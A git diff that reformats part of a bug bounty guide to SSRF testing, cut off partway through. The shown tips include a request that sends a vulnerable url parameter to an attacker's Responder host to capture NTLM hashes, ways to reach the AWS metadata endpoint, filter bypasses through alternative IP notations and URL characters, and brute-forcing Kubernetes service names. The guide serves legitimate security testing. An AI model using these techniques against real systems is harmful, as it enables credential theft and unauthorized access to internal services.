@@ -43,7 +43,7 @@ You might be able to get file read.
 Or send multi-line requests to gain additional impact
 <br>
 (Ex: gopher + redis = likely RCE)<br>
-
+<br>
 
 2-Is the target running Windows?
 
@@ -54,26 +54,26 @@ Can't hit internal services?
 Try to steal NTLM hashes with Responder.
 
 `/vulnerable?url=http://your-responder-host`
-
+<br><br>
 3-Try alternative representations of IP addresses.
 
 IPs can be represented in many ways including:
-
-• octal<br>
-• decimal<br>
-• hexadecimal<br>
-• etc.<br>
-
+```
+• octal
+• decimal
+• hexadecimal
+• etc.
+```
 Try different representations.
 
 You might get lucky.
-
-4-Can't hit 169.254.169.254?
+<br><br>
+4-Can't hit `169.254.169.254`?
 
 On AWS, "instance-data" resolves to the metadata server.
 
-Try hitting http://instance-data instead.
-
+Try hitting `http://instance-data` instead.
+<br><br>
 5- Know your target's technologies.
 
 Look at job postings!
@@ -83,25 +83,25 @@ You might not be able to hit a meta-data service.
 But there are likely other internal services!
 
 (ex: I've pulled data from an internal Elasticsearch instance)
-
+<br><br>
 6- Are they using Kubernetes?
 
-Search Burp history for ".default.svc" or ".cluster.local"
+Search Burp history for `.default.svc` or `.cluster.local`
 
 If you find references, try to hit them.
 
-Also, try to hit the Kubernetes API: https://kubernetes.default.svc
-
+Also, try to hit the Kubernetes API: `https://kubernetes.default.svc`
+<br><br>
 7- In Kubernetes, you should be brute-forcing for:
 
-HOSTNAME.<some-namespace>.svc.cluster.local
+`HOSTNAME.<some-namespace>.svc.cluster.local`
 
-I often use Burp Intruder: FUZZ.default.svc.cluster.local
+I often use Burp Intruder: `FUZZ.default.svc.cluster.local`
 
 Need better wordlists?
 
 Scrape helm charts from ArtifactHub.
-
+<br><br>
 8- Can't supply a full URL? You can still get SSRF!
 
 If your input is used to build a URL, THINK.
@@ -109,15 +109,15 @@ If your input is used to build a URL, THINK.
 Learn about URL structures.
 
 The following 4 characters have led to many SSRFs:
-
-• @<br>
-• ?<br>
-• #<br>
-• ;<br>
-
+```
+• @
+• ?
+• #
+• ;
+```
 An example is in the picture:
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/images/img1.jpeg)
-
+<br><br>
 9- If your injection is down the path, traverse!
 ```
 GET /vulnerable?id=1234
